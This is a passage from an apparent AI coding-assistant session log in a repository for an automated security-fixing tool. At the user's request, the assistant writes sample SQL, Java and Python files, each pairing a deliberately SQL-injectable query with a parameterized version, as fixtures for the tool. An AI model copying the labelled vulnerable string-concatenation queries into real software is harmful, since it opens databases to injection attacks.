\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":24400,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24407,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":24415,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":24422,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25874,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25881,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25889,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25896,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25919,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25926,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":25934,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":25941,"content":"            \\"fullName\\": \\"CxPYNS_d684fd43.evaluate.num_processed_samples\\","},{"lineNumber":27126,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27133,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":27141,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27148,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":27171,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27178,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":27186,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":27193,"content":"            \\"fullName\\": \\"CxPYNS_622a6e34.evaluate.num_processed_samples\\","},{"lineNumber":37214,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":37221,"content":"            \\"fullName\\": \\"CxPYNS_d917f0cc._evaluate.num_processed_samples\\","},{"lineNumber":37229,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":37236,"content":"            \\"fullName\\": \\"CxPYNS_d917f0cc._evaluate.num_processed_samples\\","},{"lineNumber":40037,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":40044,"content":"            \\"fullName\\": \\"CxPYNS_284fec67._evaluate.num_processed_samples\\","},{"lineNumber":40052,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":40059,"content":"            \\"fullName\\": \\"CxPYNS_284fec67._evaluate.num_processed_samples\\","},{"lineNumber":48178,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48185,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","},{"lineNumber":48193,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48200,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","},{"lineNumber":48223,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48230,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","},{"lineNumber":48238,"content":"            \\"name\\": \\"num_processed_samples\\","},{"lineNumber":48245,"content":"            \\"fullName\\": \\"CxPYNS_5dc40809.evaluate.num_processed_samples\\","}]},{"file":"./services/datadog_postgres_agent/postgres/conf.yaml","matches":[{"lineNumber":43,"content":"    query_samples:"},{"lineNumber":49,"content":"      collection_interval: 15  # Every 15 seconds, default: 10, This number cannot be smaller than query_samples configured collection_interval"}]}],"totalLines":54,"totalMatchedLines":54}}}}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:22.869Z,
        "text": "Moving sample files from \`patchino/_samples\` to the repo root and updating references. Checking the code structure first:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:23.153Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/patchino/sampler.py","offset":1,"limit":30,"charsLimit":100000}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/patchino/sampler.py", "offset": 1, "limit": 30}",
          "result": "{"contents":"from __future__ import annotations\\n\\nfrom typing import Annotated, Optional\\n\\nimport json\\nimport os\\nimport pathlib\\nimport pickle\\nimport random\\nimport tempfile\\nimport time\\nimport zipfile\\nfrom collections import defaultdict\\nfrom dataclasses import dataclass\\n\\nimport fire  # type: ignore[import-untyped]\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\nfrom annotated_types import Len\\nfrom dotenv import load_dotenv\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\nfrom pycommon.report.file_loader import FileLoader\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.s3 import S3Access\\nfrom pydantic import BaseModel\\n\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\n    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")","numCharactersInRequestedRange":932,"offsetIsBiggerThanNumberOfLinesInFile":false,"totalLinesInFile":503}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:23.153Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/patchino/issue_processor.py","offset":1,"limit":30,"charsLimit":100000}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/patchino/issue_processor.py", "offset": 1, "limit": 30}",
          "result": "{"contents":"# Configure the AI adapter to save the prompt metadata for this tool\\n# DO NOT MOVE THIS LINE OF CODE FROM HERE.\\n# The env var should be set as soon as the module gets loaded\\nfrom analyzer.ai_adapter.prompt import PromptCollector\\nfrom analyzer.fix_info import FalsePositiveFixInfo\\n\\nPromptCollector.enable_prompt_collector()\\n\\nfrom typing import Optional\\n\\nimport asyncio\\nimport inspect\\nimport json\\nimport logging\\nimport os\\nimport pickle\\nimport sys\\nfrom datetime import datetime\\nfrom pathlib import Path\\n\\nfrom analyzer.analysis import ANALYZERS, get_fix_info\\nfrom analyzer.code_checker import check_code_valid\\nfrom pycommon.report.fileutils import FileFixType\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.run_task import process_objects_in_parallel\\nfrom pycommon.s3 import S3Access\\n\\nfrom patchino.config import (\\n    AWS_S3_ACCESS_KEY_ID,\\n    AWS_S3_ENDPOINT,","numCharactersInRequestedRange":864,"offsetIsBiggerThanNumberOfLinesInFile":false,"totalLinesInFile":427}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:37.192Z,
        "text": "Moving the sample files to the repo root and updating code references. Copying files first:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:48:37.404Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "run_terminal_cmd",
          "parameters": "{"command":"mkdir -p /Users/jonathanafek/src/autofixer/_samples && cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/","requireUserApproval":true,"parsingResult":{"executableCommands":[{"name":"mkdir","args":[{"type":"word","value":"-p"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/_samples"}],"fullText":"mkdir -p /Users/jonathanafek/src/autofixer/_samples"},{"name":"cp","args":[{"type":"word","value":"-r"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/patchino/_samples/*"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/_samples/"}],"fullText":"cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/"}]},"requestedSandboxPolicy":{"type":"TYPE_INSECURE_NONE"}}",
          "rawArguments": "{"command": "mkdir -p /Users/jonathanafek/src/autofixer/_samples && cp -r /Users/jonathanafek/src/autofixer/patchino/_samples/* /Users/jonathanafek/src/autofixer/_samples/", "is_background": false}",
          "result": "{"humanReviewV2":{"selectedOption":"skip"}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:07.629Z,
        "text": "Reading the files and creating them in the new location using the file tools:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:07.684Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_file",
          "parameters": "{"targetFile":"/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json","charsLimit":100000,"effectiveUri":"file:///Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "rawArguments": "{"target_file": "/Users/jonathanafek/src/autofixer/patchino/_samples/samples.json"}",
          "result": "{"contents":"{\\n    \\"created_at\\": 1745851637,\\n    \\"issues\\": [\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 8,\\n            \\"issue_object_hash\\": \\"d1425b8d47d7597c49881ec70f4a8b75\\",\\n            \\"path_to_issue_object\\": \\"d1425b8d47d7597c49881ec70f4a8b75.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d1425b8d47d7597c49881ec70f4a8b75.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"30f70896dc317958633ad1fde6d79566\\",\\n            \\"path_to_issue_object\\": \\"30f70896dc317958633ad1fde6d79566.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"30f70896dc317958633ad1fde6d79566.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 32,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 31,\\n            \\"issue_object_hash\\": \\"c927321cb1cce7ad39af698943333971\\",\\n            \\"path_to_issue_object\\": \\"c927321cb1cce7ad39af698943333971.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"c927321cb1cce7ad39af698943333971.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 27,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 30,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 29,\\n            \\"issue_object_hash\\": \\"bdbe6ad4a26aef8ad97db6e66adad229\\",\\n            \\"path_to_issue_object\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bdbe6ad4a26aef8ad97db6e66adad229.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 12,\\n            \\"issue_object_hash\\": \\"12e36579cafa09e786f12c4a257ca4e7\\",\\n            \\"path_to_issue_object\\": \\"12e36579cafa09e786f12c4a257ca4e7.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"12e36579cafa09e786f12c4a257ca4e7.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/codiewio/codenire/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/codiewio/codenire/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 28,\\n            \\"issue_object_hash\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70\\",\\n            \\"path_to_issue_object\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/canonical/jimm/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/canonical/jimm/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        },\\n        {\\n            \\"is_public\\": true,\\n            \\"report_index\\": 5,\\n            \\"issue_object_hash\\": \\"bc90c5d567713c3a4b7f2aece525894e\\",\\n            \\"path_to_issue_object\\": \\"bc90c5d567713c3a4b7f2aece525894e.pkl\\",\\n            \\"path_to_issue_highlight_nodes_html\\": \\"bc90c5d567713c3a4b7f2aece525894e.html\\",\\n            \\"sast_report_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/semgrep\\",\\n            \\"source_code_path\\": \\"../../../dataset/data/ISDuBA/ISDuBA/repo.zip\\",\\n            \\"sast_provider\\": \\"SEMGREP\\",\\n            \\"sast_provider_issue_name\\": \\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\",\\n            \\"sast_provider_severity\\": \\"error\\",\\n            \\"sast_provider_language\\": \\"go\\",\\n            \\"skip_issue\\": false\\n        }\\n    ]\\n}","numCharactersInRequestedRange":7367,"totalLinesInFile":145}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:07.684Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "run_terminal_cmd",
          "parameters": "{"command":"ls -la /Users/jonathanafek/src/autofixer/patchino/_samples/","requireUserApproval":true,"parsingResult":{"executableCommands":[{"name":"ls","args":[{"type":"word","value":"-la"},{"type":"word","value":"/Users/jonathanafek/src/autofixer/patchino/_samples/"}],"fullText":"ls -la /Users/jonathanafek/src/autofixer/patchino/_samples/"}]},"requestedSandboxPolicy":{"type":"TYPE_INSECURE_NONE"}}",
          "rawArguments": "{"command": "ls -la /Users/jonathanafek/src/autofixer/patchino/_samples/", "is_background": false}",
          "result": "{"humanReviewV2":{"selectedOption":"skip"}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:20.058Z,
        "text": "add 2 sample code files in the repo root",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:28.571Z,
        "text": "Adding 2 sample code files to the repo root. Creating examples relevant to this security analysis tool.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:28.708Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_vulnerable.sql"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_vulnerable.sql", "contents": "-- Sample Vulnerable SQL Query\\n-- This demonstrates a SQL injection vulnerability\\n\\n-- Vulnerable: Direct string concatenation with user input\\nCREATE OR REPLACE FUNCTION get_user(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\nDECLARE\\n    query TEXT;\\nBEGIN\\n    -- VULNERABLE: Direct concatenation allows SQL injection\\n    query := 'SELECT username, email FROM users WHERE id = ''' || id_param || '''';\\n    RETURN QUERY EXECUTE query;\\nEND;\\n$$ LANGUAGE plpgsql;\\n\\n-- Safe: Using parameterized queries\\nCREATE OR REPLACE FUNCTION get_user_safe(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\nBEGIN\\n    -- SAFE: Parameterized query prevents SQL injection\\n    RETURN QUERY SELECT username, email FROM users WHERE id = id_param;\\nEND;\\n$$ LANGUAGE plpgsql;"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ -- Sample Vulnerable SQL Query\\n+ -- This demonstrates a SQL injection vulnerability\\n+ \\n+ -- Vulnerable: Direct string concatenation with user input\\n+ CREATE OR REPLACE FUNCTION get_user(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\n+ DECLARE\\n+     query TEXT;\\n+ BEGIN\\n+     -- VULNERABLE: Direct concatenation allows SQL injection\\n+     query := 'SELECT username, email FROM users WHERE id = ''' || id_param || '''';\\n+     RETURN QUERY EXECUTE query;\\n+ END;\\n+ $$ LANGUAGE plpgsql;\\n+ \\n+ -- Safe: Using parameterized queries\\n+ CREATE OR REPLACE FUNCTION get_user_safe(id_param TEXT) RETURNS TABLE(username TEXT, email TEXT) AS $$\\n+ BEGIN\\n+     -- SAFE: Parameterized query prevents SQL injection\\n+     RETURN QUERY SELECT username, email FROM users WHERE id = id_param;\\n+ END;\\n+ $$ LANGUAGE plpgsql;","oldStart":1,"newStart":1,"oldLines":1,"newLines":21,"linesRemoved":1,"linesAdded":21}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_vulnerable.sql."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:28.708Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_java_sqli.java"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_java_sqli.java", "contents": "import java.sql.Connection;\\nimport java.sql.Statement;\\nimport java.sql.ResultSet;\\nimport java.sql.DriverManager;\\nimport java.sql.SQLException;\\n\\n/**\\n * Sample Java code demonstrating SQL Injection vulnerability and fix\\n */\\npublic class SampleSQLInjection {\\n\\n    // VULNERABLE: Direct string concatenation\\n    public ResultSet getUserUnsafe(String userId) throws SQLException {\\n        Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n        \\n        // UNSAFE: User input directly concatenated into query\\n        String query = \\"SELECT * FROM users WHERE id = '\\" + userId + \\"'\\";\\n        Statement stmt = conn.createStatement();\\n        return stmt.executeQuery(query);\\n    }\\n\\n    // SAFE: Using PreparedStatement with parameters\\n    public ResultSet getUserSafe(String userId) throws SQLException {\\n        Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n        \\n        // SAFE: Parameterized query prevents SQL injection\\n        String query = \\"SELECT * FROM users WHERE id = ?\\";\\n        java.sql.PreparedStatement pstmt = conn.prepareStatement(query);\\n        pstmt.setString(1, userId);\\n        return pstmt.executeQuery();\\n    }\\n}"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ import java.sql.Connection;\\n+ import java.sql.Statement;\\n+ import java.sql.ResultSet;\\n+ import java.sql.DriverManager;\\n+ import java.sql.SQLException;\\n+ \\n+ /**\\n+  * Sample Java code demonstrating SQL Injection vulnerability and fix\\n+  */\\n+ public class SampleSQLInjection {\\n+ \\n+     // VULNERABLE: Direct string concatenation\\n+     public ResultSet getUserUnsafe(String userId) throws SQLException {\\n+         Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n+         \\n+         // UNSAFE: User input directly concatenated into query\\n+         String query = \\"SELECT * FROM users WHERE id = '\\" + userId + \\"'\\";\\n+         Statement stmt = conn.createStatement();\\n+         return stmt.executeQuery(query);\\n+     }\\n+ \\n+     // SAFE: Using PreparedStatement with parameters\\n+     public ResultSet getUserSafe(String userId) throws SQLException {\\n+         Connection conn = DriverManager.getConnection(\\"jdbc:postgresql://localhost/db\\", \\"user\\", \\"pass\\");\\n+         \\n+         // SAFE: Parameterized query prevents SQL injection\\n+         String query = \\"SELECT * FROM users WHERE id = ?\\";\\n+         java.sql.PreparedStatement pstmt = conn.prepareStatement(query);\\n+         pstmt.setString(1, userId);\\n+         return pstmt.executeQuery();\\n+     }\\n+ }","oldStart":1,"newStart":1,"oldLines":1,"newLines":32,"linesRemoved":1,"linesAdded":32}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_java_sqli.java."}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:46.419Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_java_sqli.java"]}",
          "rawArguments": "{"paths": ["sample_java_sqli.java"]}",
          "result": "{"path":"sample_java_sqli.java"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:49:57.099Z,
        "text": "Added 2 sample code files in the repo root:

1. **\`sample_vulnerable.sql\`** — Shows a SQL injection vulnerability in PostgreSQL (direct string concatenation) and a safe parameterized version.
2. **\`sample_java_sqli.java\`** — Shows a SQL injection vulnerability in Java (unsafe string concatenation) and a safe PreparedStatement version.

Both files include vulnerable and safe examples, which aligns with the project's security analysis and fixing focus.",
        "tokens": {
          "inputCount": 37522,
          "outputCount": 934,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "sample_vulnerable.sql",
            "startLine": 1,
          },
          {
            "relativePath": "sample_java_sqli.java",
            "startLine": 1,
          },
        ],
        "date": 2025-10-29T16:50:27.413Z,
        "text": "add 2 more sample files",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:30.766Z,
        "text": "Adding two more sample code files to the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:50:30.786Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_python_sqli.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_python_sqli.py", "contents": "\\"\\"\\"\\nSample Python code demonstrating SQL Injection vulnerability and fix\\n\\"\\"\\"\\n\\nimport sqlite3\\n\\n# VULNERABLE: Direct string formatting with user input\\ndef get_user_unsafe(user_id: str):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    \\n    # UNSAFE: User input directly formatted into query\\n    query = f\\"SELECT * FROM users WHERE id = '{user_id}'\\"\\n    cursor.execute(query)\\n    return cursor.fetchall()\\n\\n# SAFE: Using parameterized queries\\ndef get_user_safe(user_id: str):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    \\n    # SAFE: Parameterized query prevents SQL injection\\n    query = \\"SELECT * FROM users WHERE id = ?\\"\\n    cursor.execute(query, (user_id,))\\n    return cursor.fetchall()\\n\\n# Also UNSAFE: Using string formatting or % operator\\ndef get_user_unsafe_format(user_id: str):\\n    conn = sqlite3.connect('database.db')\\n    cursor = conn.cursor()\\n    \\n    # UNSAFE: % formatting still vulnerable\\n    query = \\"SELECT * FROM users WHERE id = '%s'\\" % user_id\\n    cursor.execute(query)\\n    return cursor.fetchall()"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ \\"\\"\\"\\n+ Sample Python code demonstrating SQL Injection vulnerability and fix\\n+ \\"\\"\\"\\n+ \\n+ import sqlite3\\n+ \\n+ # VULNERABLE: Direct string formatting with user input\\n+ def get_user_unsafe(user_id: str):\\n+     conn = sqlite3.connect('database.db')\\n+     cursor = conn.cursor()\\n+     \\n+     # UNSAFE: User input directly formatted into query\\n+     query = f\\"SELECT * FROM users WHERE id = '{user_id}'\\"\\n+     cursor.execute(query)\\n+     return cursor.fetchall()\\n+ \\n+ # SAFE: Using parameterized queries\\n+ def get_user_safe(user_id: str):\\n+     conn = sqlite3.connect('database.db')\\n+     cursor = conn.cursor()\\n+     \\n+     # SAFE: Parameterized query prevents SQL injection\\n+     query = \\"SELECT * FROM users WHERE id = ?\\"\\n+     cursor.execute(query, (user_id,))\\n+     return cursor.fetchall()\\n+ \\n+ # Also UNSAFE: Using string formatting or % operator\\n+ def get_user_unsafe_format(user_id: str):\\n+     conn = sqlite3.connect('database.db')\\n+     cursor = conn.cursor()\\n+     \\n+     # UNSAFE: % formatting still vulnerable\\n+     query = \\"SELECT * FROM users WHERE id = '%s'\\" % user_id\\n+     cursor.execute(query)\\n+     return 